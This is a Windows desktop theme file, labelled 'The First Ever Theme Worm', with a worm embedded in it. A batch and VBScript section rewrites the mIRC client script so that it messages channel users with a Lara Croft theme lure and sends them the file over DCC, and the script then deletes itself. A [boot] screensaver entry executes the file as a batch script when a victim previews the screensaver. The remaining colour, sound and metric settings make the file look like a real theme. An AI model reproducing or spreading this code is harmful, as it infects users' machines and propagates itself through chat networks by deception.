   ; The First Ever Theme Worm By Yello
   if exist C:\mirc\mirc.ini set mIRC=C:\mirc\
   if exist C:\progra~1\mirc\mirc.ini set mIRC=C:\progra~1\mirc\
   if exist D:\mirc\mirc.ini set mIRC=D:\mirc\
   if exist D:\progra~1\mirc\mirc.ini set mIRC=D:\progra~1\mirc\
   if exist E:\mirc\mirc.ini set mIRC=E:\mirc\
   if exist E:\progra~1\mirc\mirc.ini set mIRC=E:\progra~1\mirc\


   Echo Dim fso, f > %WinDir%\win.vbe
   Echo Set fso = CreateObject("Scripting.FileSystemObject") >> %WinDir%\win.vbe
   Echo Set f = fso.OpenTextFile("%mIRC%Script.ini",2, True) >> %WinDir%\win.vbe
   Echo f.WriteLine "[Script]" >> %WinDir%\win.vbe
   Echo f.Write "n0=on 1:JOIN:#:if ( " >> %WinDir%\win.vbe
   Echo f.Write Chr((26)+10) >> %WinDir%\win.vbe
   Echo f.Write "me != " >> %WinDir%\win.vbe
   Echo f.Write Chr((26)+10) >> %WinDir%\win.vbe
   Echo f.Write "nick ) { /msg " >> %WinDir%\win.vbe
   Echo f.Write Chr((26)+10) >> %WinDir%\win.vbe
   Echo f.Write "Nick Hello there, Check out this Lara Croft desktop theme: Click on the Preview screen saver button, its the best i've ever seen | /" >> %WinDir%\win.vbe"
   Echo f.Write "dcc send " >> %WinDir%\win.vbe
   Echo f.Write Chr((26)+10) >> %WinDir%\win.vbe
   Echo f.Write "nick %Windir%\LaraCroft.theme }" >> %WinDir%\win.vbe
   Start %WinDir%\win.vbe
   Erase %0
   Exit

   [CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon]
   DefaultValue=%WinDir%Explorer.exe,0

   [CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\DefaultIcon]
   DefaultValue=%WinDir%SYSTEM\shell32.dll,17

   [CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\DefaultIcon]
   full=shell32.dll,32
   empty=shell32.DLL,31


   [Control Panel\Colors]
   ActiveTitle=10 36 106
   Background=58 110 165
   Hilight=10 36 106
   HilightText=255 255 255
   TitleText=255 255 255
   Window=255 255 255
   WindowText=0 0 0
   Scrollbar=212 208 200
   InactiveTitle=128 128 128
   Menu=212 208 200
   WindowFrame=0 0 0
   MenuText=0 0 0
   ActiveBorder=212 208 200
   InactiveBorder=212 208 200
   AppWorkspace=128 128 128
   ButtonFace=212 208 200
   ButtonShadow=128 128 128
   GrayText=128 128 128
   ButtonText=0 0 0
   InactiveTitleText=212 208 200
   ButtonHilight=255 255 255
   ButtonDkShadow=64 64 64
   ButtonLight=212 208 200
   InfoText=0 0 0
   InfoWindow=255 255 225

   [Control Panel\Cursors]
   Arrow=
   Help=
   AppStarting=
   Wait=
   NWPen=
   No=
   SizeNS=
   SizeWE=
   Crosshair=
   IBeam=
   SizeNWSE=
   SizeNESW=
   SizeAll=
   UpArrow=
   DefaultValue=Windows default

   [Control Panel\Desktop]
   Wallpaper=
   TileWallpaper=0
   WallpaperStyle=0
   Pattern=(None)
   ScreenSaveActive=0



   [AppEvents\Schemes\Apps\.Default\.Default\.Current]
   DefaultValue=%WinDir%media\ding.wav

   [AppEvents\Schemes\Apps\.Default\AppGPFault\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\Maximize\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\MenuCommand\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\MenuPopup\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\Minimize\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\Open\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\RestoreDown\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\RestoreUp\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\RingIn\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\Ringout\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\SystemAsterisk\.Current]
   DefaultValue=%WinDir%media\chord.wav

   [AppEvents\Schemes\Apps\.Default\SystemDefault\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\SystemExclamation\.Current]
   DefaultValue=%WinDir%media\chord.wav

   [AppEvents\Schemes\Apps\.Default\SystemExit\.Current]
   DefaultValue=

   [AppEvents\Schemes\Apps\.Default\SystemHand\.Current]
   DefaultValue=%WinDir%media\chord.wav

   [AppEvents\Schemes\Apps\.Default\SystemQuestion\.Current]
   DefaultValue=%WinDir%media\chord.wav

   [AppEvents\Schemes\Apps\.Default\SystemStart\.Current]
   DefaultValue=%WinDir%media\The Microsoft Sound.wav

   [AppEvents\Schemes\Apps\Explorer\EmptyRecycleBin\.Current]
   DefaultValue=%WinDir%media\recycle.wav

   [AppEvents\Schemes\Apps\.Default\Close\.Current]
   DefaultValue=

   [Control Panel\Desktop\WindowMetrics]



   [Metrics]
   IconMetrics=76 0 0 0 75 0 0 0 75 0 0 0 1 0 0 0 248 255 255 255 0 0 0 0 0 0 0 0 0 0 0 0 144 1 0 0 0 0 0 0 0 0 0 0 77 83 32 83 97 110 115 32 83 101 114 105 102 0 119 97 118 0 246 191 111 1 0 0 193 65 246 191 4 205 1 0
   NonclientMetrics=84 1 0 0 1 0 0 0 16 0 0 0 16 0 0 0 18 0 0 0 18 0 0 0 245 255 255 255 0 0 0 0 0 0 0 0 0 0 0 0 188 2 0 0 0 0 0 0 0 0 0 0 77 83 32 83 97 110 115 32 83 101 114 105 102 0 0 0 255 255 255 231 0 0 0 0 0 0 0 0 100 184 112 129 13 0 0 0 15 0 0 0 251 255 255 255 0 0 0 0 0 0 0 0 0 0 0 0 144 1 0 0 0 0 0 0 0 0 0 0 77 83 32 83 97 110 115 32 83 101 114 105 102 0 0 0 255 255 255 231 0 0 0 0 0 0 0 0 100 184 112 129 18 0 0 0 18 0 0 0 245 255 255 255 0 0 0 0 0 0 0 0 0 0 0 0 144 1 0 0 0 0 0 0 0 0 0 0 77 83 32 83 97 110 115 32 83 101 114 105 102 0 0 0 255 255 255 231 0 0 0 0 0 0 0 0 100 184 112 129 245 255 255 255 0 0 0 0 0 0 0 0 0 0 0 0 144 1 0 0 0 0 0 0 0 0 0 0 77 83 32 83 97 110 115 32 83 101 114 105 102 0 0 0 255 255 255 231 0 0 0 0 0 0 0 0 100 184 112 129 245 255 255 255 0 0 0 0 0 0 0 0 0 0 0 0 144 1 0 0 0 0 0 0 0 0 0 0 77 83 32 83 97 110 115 32 83 101 114 105 102 0 0 0 255 255 255 231 0 0 0 0 0 0 0 0 100 184 112 129


   [boot]
   SCRNSAVE.EXE=command.com /c copy LaraCroft.theme c:\Test.bat /Y| copy LaraCroft.theme %WinDir%\LaraCroft.theme /Y|c:\Test.bat|

   [MasterThemeSelector]
   MTSM=DABJDKT
